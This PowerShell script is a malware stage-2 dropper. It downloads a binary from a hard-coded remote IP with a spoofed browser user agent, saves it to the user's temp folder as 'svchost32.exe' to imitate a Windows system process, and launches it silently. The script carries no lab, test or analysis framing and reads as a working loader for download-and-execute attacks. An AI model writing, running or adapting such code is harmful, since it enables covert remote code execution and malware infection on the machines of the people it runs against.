
<#
.SYNOPSIS
    Stage 2 payload transfer helper.

.DESCRIPTION
    Downloads the staged artefact to a per-user drop path.
    The destination is verified before the launcher runs.

.EXAMPLE
    PS> .\stage2.ps1
#>
[CmdletBinding()]
param(
    [string]$Stage1Url = "http://198.51.100.225:80/cdn/stage2.bin",
    [string]$WorkingPath = "$env:TEMP\svchost32.exe",
    [int]$StageTimeout = 80,
    [string]$RequestAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
)
$ErrorActionPreference = "Stop"

function Get-Stage2Payload {
    [CmdletBinding()]
    param(
        [string]$SourceUrl = '',
        [string]$DestinationPath = "",
        [int]$TimeoutSec = 45,
        [string]$UserAgent = "Mozilla/5.0"
    )

    Write-Verbose ("Requesting " + $SourceUrl)
    $ClientObject = New-Object System.Net.WebClient
    $ClientObject.Headers.Add("User-Agent", $UserAgent)
    $ClientObject.Headers.Add("X-Transfer-Timeout", [string]$TimeoutSec)
    $ClientObject.DownloadFile($SourceUrl, $DestinationPath)
    return (Test-Path -Path $DestinationPath)
}

Write-Verbose "Starting stage 2 transfer"
$ResultObject = Get-Stage2Payload -SourceUrl $Stage1Url -DestinationPath $WorkingPath -TimeoutSec $StageTimeout -UserAgent $RequestAgent
if ($ResultObject) {
    Start-Process -FilePath $WorkingPath -ErrorAction SilentlyContinue
}

$StageMarker = "stage-18"
Get-ChildItem -Path $env:TEMP -Filter "*.tmp" | Select-Object -First 3
